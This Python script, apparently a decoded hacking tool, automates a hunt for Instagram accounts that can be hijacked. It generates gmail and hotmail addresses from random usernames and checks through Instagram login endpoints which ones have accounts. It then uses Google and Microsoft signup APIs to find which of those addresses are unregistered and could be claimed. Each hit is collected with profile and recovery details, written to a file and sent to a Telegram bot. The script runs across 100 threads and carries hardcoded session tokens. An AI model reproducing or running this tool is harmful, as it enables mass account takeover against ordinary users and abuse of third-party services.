# --> Done Decoded By <⏤͟͞𝗝𝗢𝗞𝗘𝗥 🇵🇰> <\> DecodeX+
# --> Encryption </> CYTHON
# --> Follow me on Telegram as @Theyhates_joker
# --> Developed By :  @EZ_X4

print('DECODE BY JOKER | @EZ_X4 •')
from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice,randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import time
class tanji:
  def __init__(self):
    self.hits=0
    self.bad_email=0
    self.bad_instgram=0
    self.good_insgram=0
    self.token=input('𝘌𝘯𝘵𝘦𝘳 𝘛𝘰𝘬𝘦𝘯 : ')
    self.id=input('𝘌𝘯𝘵𝘦𝘳 𝘐𝘋 : ')
    os.system('clear' if os.name == 'posix' else 'cls')
    while True:
      try:
          headers = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'en-US,en;q=0.9',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
          response = requests.get('https://signup.live.com/signup', headers=headers)
          canary=str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
          self.amsc=response.cookies.get_dict()['amsc']
          cookies = {
      'amsc': self.amsc,
    }
          headers = {
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': canary,
      'content-type': 'application/json; charset=utf-8',
      'origin': 'https://signup.live.com',
      'referer': 'https://signup.live.com/',
      'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
          json_data = {
      'clientExperiments': [
          {
              'parallax': 'enableplaintextforsignupexperiment',
              'control': 'enableplaintextforsignupexperiment_control',
              'treatments': [
                  'enableplaintextforsignupexperiment_treatment',
              ],
          },
      ],
    }
          response = requests.post(
      'https://signup.live.com/API/EvaluateExperimentAssignments',
      cookies=cookies,
      headers=headers,
      json=json_data,
    ).json()
          self.canary=response['apiCanary']
          break
      except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print('errors get hotmail tokens')
    os.system('clear' if os.name == 'posix' else 'cls')
    for _ in range(100):
        Thread(target=self.home).start()
  def insta1(self,email):
    while True:
      try:
        csrftoken = md5(str(time.time()).encode()).hexdigest()
        headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
                'x-csrftoken': csrftoken,
            }

        data = {
            'username': email,
        }

        response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data).text
        if 'showAccountRecoveryModal' in response:
          return True
        else:
          return False
      except:''
  def insta2(self,email):
    while True:
      try:
        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                         'Cookie':'missing',
                         'Accept-Encoding':'gzip, deflate',
                         'Accept-Language':'en-US',
                         'X-IG-Capabilities':'3brTvw==',
                         'X-IG-Connection-Type':'WIFI',
                         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                      'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {
        'uuid':uid, 
        'password':'ffffdddddaaa666', 
        'username':email,
        'device_id':uid, 
        'from_reg':'false', 
        '_csrftoken':'missing', 
        'login_attempt_countn':'0'
           }
        re = requests.post(url,headers=headers,data=data).text
        if 'bad_password' in re:
          return True
        else:
          return False
      except:''

  def check_gmail(self,email):
    while True:
      try:
        if '@' in email:
          email=email.split('@')[0]
        tim=(str(time.time()).split('.')[0])
        headers = {
              'authority': 'accounts.google.com',
              'accept': '*/*',
              'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; ; ; ; ; ; ; ; ; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW; ; ; ',
              'origin': 'https://accounts.google.com',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-full-version': '"124.0.6327.4"',
              'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Linux"',
              'sec-ch-ua-platform-version': '""',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': generate_user_agent(),
              'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
              'x-client-data': 'CLrdygE=',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
              'x-same-domain': '1',
          }
        par = {
              'biz': 'false',
              'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
              'ddm': '0',
              'dsh': f'S-{tim}:1722139307145196',
              'flowEntry': 'SignUp',
              'flowName': 'GlifWebSignIn',
          }
        re = requests.get(f'https://accounts.google.com/lifecycle/flows/signup?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1&ddm=0&flowEntry=SignUp&flowName=GlifWebSignIn&dsh=S{tim}%3A1722152876221519', params=par, cookies=None, headers=headers)
        try:
            tok=re.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
        except:pass
        params = {
              'rpcids': 'E815hb',
              'source-path': '/lifecycle/steps/signup/name',
              'f.sid': '6212541759014659703',
              'bl': 'boq_identity-account-creation-evolution-ui_20240724.08_p0',
              'hl': 'ar',
              'TL': tok,
              '_reqid': '136953',
              'rt': 'c',
          }
        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22zaid%5C%22%2C%5C%22ali%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0e6K9lFzNAdC3rGk8SRcG6K%3A1722150498848&'
        rr = requests.post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=None,
              headers=headers,
              data=data,
          )
        try:
            tok=rr.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
        except:
            pass
          #print(tok)
        params = {
              'rpcids': 'eOY7Bb',
              'source-path': '/lifecycle/steps/signup/birthdaygender',
              'f.sid': '6212541759014659703',
              'bl': 'boq_identity-account-creation-evolution-ui_20240724.08_p0',
              'hl': 'ar',
              'TL': tok,
              '_reqid': '836953',
              'rt': 'c',
          }
        data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B2000%2C10%2C20%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CkV1qXQUCAAYqurJyCrqNOonCTM4ZXkP0ADQBEArZ1NP5cu3RU1Ycj4okwH-FNrHtFcz5kZBn8EpMmEWW3FnHInLGR_XrRHOVc1WHeAUtzQAAAjydAAAAHKcBB7EAQ-hrZe31BIDxYMgrnGE6oK9_vcOJJvq-P7SWhmo-kXKqaeCHPu68jHw8N9EWZEJEnNZOwduBTXmjTumyvoVLvsGsZuFWBSE6NPqtSvD4-VxfdrQMRUQi-qM3K-OlKEmlndu-g1oWwK9-DZf-d4vlqH4yeQXXjzQ_uQRJ8_9cbD_i52-ytbwhIbQjJSwblNuegt5XR_Fj5ERwy2QjQTvIPq5IXWqCAthJtLosMFENKLf7BqSk-GjX_wN9t9Yi4E4Zd4q4zI_U-KJHSNxrmVMe-09ZvzDaIUdxMyFWqDumhCdnbWB3jk_DqW-2-JTlyYzdaBv9iHtxQzK1hEjrliwgM852uuzN3R2eDoXHQR1kt0VEIt18MLbYtiCEVZfQQDl0t3w8IdmRuav7C5YjWcZ_1B4LyIrLRl0ps23K2xNCh4Yx1of8pjLaXkiMM3KtqBql9uCOj5zAnteeSaYDYXGoyL2P4AGZz56cplzO5togjyEl2Kruhv14XPN-3QKQ5pVD90oigYfo9S3lwKjrw5hOb_W-5i_0iTSKnzBbqmpHyquSrBMXaW4I6WIHCg74T06hH0eHX8JDmJu9fqUV98FurLx7CsjmFt2BgaF9q_YW-afTpws4seT7OCF-ym7IgFipEWz4XD6YdnJrM0QR-lGv9zaJjs0Prh2MoTREL0Ynyeyq4NHhAKBlQDZVUWGi7hexjCvryddX50VRV1FcdIe67rew5EJOOjSkVGBnTV0a2xvkgilEddhzJ0Ie2y_p8sTfXU4sUBb3CLvIiHCd-RbxjzjXeZLWU0LpLuFXD5zkgjQpXYX-rymsoPTi0gkpKcoUsIb2YEpOpauX24SyFPXm1Mr-3yl5OL_BoBdsCoBspMq8Rdk051GJXiP03g2i3vP6y4nIUs4nHB-0hZ9VOurDEWt6xp2fJzmvAUkgEREAoX8gQi0Q-iKJVkk6Lf76gdTxh3YbPcMBXjwjYhzbZeK-OvaEllcwwR5K1Zqmu0jPJB5-HImC55mABllihUHOzL87y8wVu-EZxS8n2O9Z4WfSgczJTI3tzUq6JUt3chFYXyYjvr7WmJZjC8LOIwRZaMALEYmEoIngQPy8guZdRXW40vVgNudUiVdfmLegNmRCUfLRWtVXouIKP0mC_-L-IW_WM_tFDSuGh3EOvuS224JcZN5fIRi0aREJYEjItygdNLQb2kAK4K-oVaF6TlK5MZn4wNWE5xaNb3dyyM83gyn5JYLxHL95voWhIaoW5_qPMs1hTQdMObhpXYCmCzyarjgrMVx05kH9Vz211x4THnsOiyIdLT_g1JM-jy2bdytPUOhHO4Q6hSnDp4xAoJ1PE2-LSm-Ee1-_dcKqFXefWt94OmDacYp1KeoJg0ofTsye4k2dj7B6UsH1m9AakITEITc6WsCGMRJCYcfBT7MI4wSn00Xa5WdCPMvRwOTA7FTWQpkmo7xnHlU1WA1PQgZX0ff5RTzogLGd8CJXfFgW8CIAO_-ovqKKtuHuZj4-YTMuvtwffnm01PppryBr886oBFaB7BNL3htjNTzltnMxalSVLSjYvhCNcqxDVgSJuPfnju6imzufHKVUvtY2Qdj4PGtUjxtjq05GaVcJXXyQ3kCd7QlXonfevIxn0aYt1kvSWdcHEZ--LLSdAeCjQWk3l7voy7GswqP-w6X_vGqUFgTD3MoaAh5_coYdVDnW9LSW7tPnpSgYGKcqmhpuNdu9zr1YpH5OjpkABmR1zBFn-clyjWoaBv_9aQ9bUlYQeBlSQWHCx6IveyEJ2jAT423lfoOefQHXdEJo2ZlSnMdeZJJ34_VwAOQvL6kgC3FosGmJ5VIX63O4RsIReQ%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0e6K9lFzNAdC3rGk8SRcG6K%3A1722150498848&'
        rz = requests.post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=None,
              headers=headers,
              data=data,
          )
        headers = {
              'authority': 'accounts.google.com',
              'accept': '*/*',
              'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; ; ; ; ; ; ; ; ; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW; ; ; ',
              'origin': 'https://accounts.google.com',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-full-version': '"124.0.6327.4"',
              'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Linux"',
              'sec-ch-ua-platform-version': '""',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
              'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
              'x-client-data': 'CLrdygE=',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
              'x-same-domain': '1',
          }
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'
        params = {

              'TL': tok,

          }
        re = requests.post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=None,
              headers=headers,
              data=data,
          ).text
        if 'signup' in re:return True
        else:return False
      except Exception as e:''
  def get_info(self,username,domen):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
             'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
            'ig_sig_key_version': '4',
        } 
        try:
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
            rest = response.json()['email']
        except:
            rest = None
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'referer': 'https://www.instagram.com/{}/'.format(username),
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'username': username,
        }
        try:response = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                params=params,
                headers=headers,
            ).json()
        except:response=None
        try:
            id=response['data']['user']['id']
        except:
            id=None
        try:
            followerNum=response['data']['user']['edge_followed_by']['count']
        except:
            followerNum=None
        try:
            followingNum=response['data']['user']['edge_follow']['count']
        except:
            followingNum=None
        try:
            postNum=response['data']['user']['edge_owner_to_timeline_media']['count']
        except:
            postNum=None
        try:
            isPraise=response['data']['user']['is_private']
        except:
            isPraise=None
        try:
            full_name=response['data']['user']['full_name']
        except:
            full_name=None
        try:
            biography=response['data']['user']['biography']
        except:
            biography=None
        try:
            if id == None:date=None
            else:
                try:
                    date=requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id)).json()['date']
                except:date=None
        except:date=None
        info='''

 ⊛━━━━━━━━━━━━━━⍟
 ┃BRO YOU GOT HIT ┃
 ⊛━━━━━━━━━━━━━━⊛
  folowers : {}
  following : {}
  total posts : {}
  isPraise : {}
  username : {}
  email : {}@{}
  date : {}
  id : {}
  full name : {}
  bio : {}
  rest : {}
 ⊛━━━━━━━━━━⍟
 ┃DECODE BY JOKER | @EZ_X4 • ┃
 ⊛━━━━━━━━━━⊛
        '''.format(followerNum,followingNum,postNum,isPraise,username,username,domen,date,id,full_name,biography,rest)
        print(info)
        with open(f'Dec-By-JOKER.txt','a') as f:
            f.write(info+'\n')
    except:
        info='''

          ⊛━━━━━━━━━━━━━━⍟
          ┃TANJI YOU GOT HIT ┃
          ⊛━━━━━━━━━━━━━━⊛
          folowers : {}
          following : {}
          total posts : {}
          isPraise : {}
          username : {}
          email : {}@{}
          date : {}
          id : {}
          full name : {}
          bio : {}
          rest : {}
           ⊛━━━━━━━━━━⍟
           ┃DECODE BY JOKER | @EZ_X4 • ┃
           ⊛━━━━━━━━━━⊛
                '''.format(None,None,None,None,username,username,domen,None,None,None,None,None)
        print(info)
        with open(f'Dec-By-JOKER.txt','a') as f:
            f.write(info+'\n')
    while True:
        try:
            requests.get('https://api.telegram.org/bot'+str(self.token)+'/sendMessage?chat_id='+str(self.id)+f'&text={info}');return
        except:''


  def check_hotmail(self,email):
    while True:
      try:
        cookies = {
  'amsc': self.amsc,
}
        headers = {
  'accept': 'application/json',
  'accept-language': 'en-US,en;q=0.9',
  'canary': self.canary,
  'content-type': 'application/json; charset=utf-8',
  'origin': 'https://signup.live.com',
  'referer': 'https://signup.live.com/',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        json_data = {
  'signInName': email,
}
        response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data).text
        if '"isAvailable":true' in response:
          return True
        else:
          return False
      except Exception as e:''
  def get_username(self):
    while True:
      try:

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded',
              'origin': 'https://www.instagram.com',
              'priority': 'u=1, i',
              'sec-ch-prefers-color-scheme': 'dark',
              'sec-ch-ua': '"Opera";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
              'sec-ch-ua-full-version-list': '"Opera";v="111.0.5168.61", "Chromium";v="125.0.6422.143", "Not.A/Brand";v="24.0.0.0"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
              'x-asbd-id': '129477',
              'x-bloks-version-id': '213c82555f99bb0cecb045c627a22f08209d7a699fc238c7e73a0482e70267f9',
              'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
              'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
              'x-fb-lsd': '3TdmFoJ7r2hQowntSy6Exd',
              'x-ig-app-id': '936619743392459',
              'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq',
          }
          data = {
              'av': '17841408545457742',
              '__user': '0',
              '__a': '1',
              '__req': '53',
              '__hs': '19920.HYP:instagram_web_pkg.2.1..0.1',
              'dpr': '1',
              '__ccg': 'UNKNOWN',
              '__rev': '1014910249',
              '__s': 'lgqvll:0onelj:i7g1ua',
              '__hsi': '7392194034338563714',
              '__dyn': '7xeUjG1mxu1syaxG4Vp41twpUnwgU7SbzEdF8vyUco2qwJyEiw9-1DwUx60p-0LVE4W0om78c87m0yE462mcw5Mx62G5UswoEcE7O2l0Fwqo31w9O1TwQzXw8W58jwGzEaE2iwNwKxm5o2eUlwhEe88o5i7U1bobpEbUGdwtUd-2u2J08O321LwTwKG1pg2fwxyo6O1FwlEcUed6goK2OubK5V89FbxG6Uf9EO6UaU',
              '__csr': 'iMkMF5NsIh2I4Aggpik9SLfZgxAZOsJh6DcNcUFXH-GHqnlaoSiypHBiVaFkhtdFmO-AjjKW8DS8UVrnJ3vihVXAiHApWyu8CWACiKWQArCWl24rBWaJaHGSbyHl5Dz8yprKaKGGmjy9EhKUy8BACKmmuXWyryp-8Bgqw059QwmGw9y5e0aLypngsDPG4k5d0oU7T-swvg14U2Nxpa4kqdiul0l9m0ieq1OwSggwlE36w3ePGeG092xq2K250k8louxClkUPowHDmok6U26xm0Qkao4FhKEJK5riP0loV0cS0tu13wwx1G4kyKsa1Kcxqm2aE6C0BsMy1PxiohDk8wd_h8146148A9Cg6mWm0H944ye4QfAwbiaU5eUhERkq2y1Twjo96E9Hp9UiQcg1EQ2Smlo7eUG6oB7w0ovEbu3q0d8w7vw2a8dS1ywBQ0tN0',
              '__comet_req': '7',
              'fb_dtsg': 'NAcN9-rfGhppacO0TiJS1KOuTzGJmIJqDEX_mLq8xVMayYEUgtoQyxQ:17853599968089360:1719656032',
              'jazoest': '26445',
              'lsd': '3TdmFoJ7r2hQowntSy6Exd',
              '__spin_r': '1014910249',
              '__spin_b': 'trunk',
              '__spin_t': '1721129295',
              'fb_api_caller_class': 'RelayModern',
              'fb_api_req_friendly_name': 'PolarisProfilePageContentDirectQuery',
              'variables': '{"id":"'+str(randrange(1,402149008))+'","render_surface":"PROFILE"}',
              'server_timestamps': 'true',
              'doc_id': '7663723823674585',
          }
          username = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data).json()['data']['user']['username']
          return [username]
      except Exception as e:''
  def home(self):
    while True:
        try:
            sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')

            while True:
                try:
                    usernames=self.get_username()
                    if usernames == None:''
                    else:
                        break
                except:''
            for username in usernames:
                sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instgram : {self.good_insgram}\r''')
                api1=choice('122')
                api2=choice('122')
                email1=username+'@gmail.com'
                email2=username+'@hotmail.com'
                if '1' == api1:
                    s11=self.insta1(email1)
                elif '2' == api1:
                    s11=self.insta2(email1)
                if '1' == api2:
                    s22=self.insta1(email2)
                elif '2' == api2:
                    s22=self.insta2(email2)
                if s11 == True:
                    self.good_insgram+=1
                    qq=self.check_gmail(email1)
                    if qq == True:
                        self.hits+=1
                        username,domen=email1.split('@')
                        self.get_info(username,domen)
                    else:
                        self.bad_email+=1
                else:
                    self.bad_instgram+=1
                if s22 == True:
                    self.good_insgram+=1
                    qq=self.check_hotmail(email2)
                    if qq == True:
                        self.hits+=1
                        username,domen=email2.split('@')
                        self.get_info(username,domen)
                    else:
                        self.bad_email+=1
                else:
                    self.bad_instgram+=1
        except Exception as e:''

tanji()
